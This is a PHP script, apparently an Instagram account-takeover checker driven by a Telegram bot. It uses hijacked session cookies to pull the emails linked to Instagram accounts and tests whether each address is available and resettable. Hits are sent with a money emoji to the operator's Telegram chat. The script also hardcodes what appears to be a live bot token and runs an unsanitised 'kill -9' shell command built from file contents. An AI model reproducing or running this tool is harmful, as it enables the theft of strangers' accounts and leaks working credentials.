<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_	contents('config.json'),1);
$id = $config['1133101982'];
$token = $config['1202363834:AAEaKXmp5WKUQTFvCQeHPP_upmzECrq-vME'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'] . $accounts[$screen]['sessionid'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$true = 0;
$false = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"- *Status:*",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
                [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'True: '.$true,'callback_data'=>'gj']],
                [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
            ]
        ])
]);
$se = 100;
$editAfter = 50;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false ) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
        if (preg_match('/(live|hotmail|outlook|yahoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
                    if(checkMail($mail)){
                        $inInsta = inInsta($mail);
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "Hi There Is An Account Here Come on 💸\n━━━━━━━━━━━━\n.💸. UserName : [$usern](instagram.com/$usern)\n.💸. Email : [$mail]\n.💸.Followers : $follow\n.💸. Following : $following\n.💸. PoSt : $media\n━━━━━━━━━━━━\nBy :- [@MouhammedAli]",
                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
                                            [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
                                            [['text'=>'True: '.$true,'callback_data'=>'gj']],
                                            [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                          echo "No Rest $mail\n";
                        }
                    } else {
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
          echo "BlackList - $mail\n";
        }
    } else {
        echo "Not Bussines - $user\n";
    }
    usleep(750000);
    $i++;
    if($i == $editAfter){
        bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>'Checked: '.$i,'callback_data'=>'fgf']],
                    [['text'=>'On User: '.$user,'callback_data'=>'fgdfg']],
                    [['text'=>"Gmail: $gmail",'callback_data'=>'dfgfd'],['text'=>"Yahoo: $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'MailRu: '.$mailru,'callback_data'=>'fgd'],['text'=>'Hotmail: '.$hotmail,'callback_data'=>'ghj']],
                    [['text'=>'True: '.$true,'callback_data'=>'gj']],
                    [['text'=>'False: '.$false,'callback_data'=>'dghkf']]
                ]
            ])
        ]);
        $editAfter += 50;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"انتهى الفحص : ".explode(':',$screen)[0]]);

